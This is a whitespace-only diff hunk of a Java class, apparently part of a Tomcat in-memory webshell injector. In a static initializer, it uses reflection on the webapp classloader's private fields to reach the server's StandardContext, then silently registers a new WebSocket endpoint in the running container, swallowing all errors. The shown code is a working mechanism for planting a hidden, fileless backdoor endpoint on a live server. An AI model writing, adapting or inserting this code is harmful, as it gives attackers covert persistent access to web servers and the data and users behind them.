@@ -24,22 +24,22 @@ public class TWSMSFromThread extends Endpoint implements MessageHandler.Whole<St
     static {
         try {
             WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
-            StandardContext       standardContext;
+            StandardContext standardContext;
 
             try {
                 standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
             } catch (Exception ignored) {
                 Field field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
                 field.setAccessible(true);
-                Object root   = field.get(webappClassLoaderBase);
-                Field  field2 = root.getClass().getDeclaredField("context");
+                Object root = field.get(webappClassLoaderBase);
+                Field field2 = root.getClass().getDeclaredField("context");
                 field2.setAccessible(true);
 
                 standardContext = (StandardContext) field2.get(root);
             }
 
-            ServerEndpointConfig build     = ServerEndpointConfig.Builder.create(TWSMSFromThread.class, pattern).build();
-            WsServerContainer    attribute = (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());
+            ServerEndpointConfig build = ServerEndpointConfig.Builder.create(TWSMSFromThread.class, pattern).build();
+            WsServerContainer attribute = (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());
             attribute.addEndpoint(build);
             standardContext.getServletContext().setAttribute(pattern, pattern);
         } catch (Exception ignored) {
